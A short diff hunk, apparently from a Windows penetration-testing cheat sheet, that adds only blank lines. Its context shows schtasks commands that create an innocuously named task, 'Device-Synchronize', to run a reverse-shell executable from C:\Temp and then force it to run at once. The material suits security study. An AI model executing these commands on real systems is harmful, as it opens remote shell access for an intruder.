@@ -17,3 +17,5 @@ schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshel
 # Force run it now !
 schtasks /run /tn "Device-Synchronize"
 ```
+
+
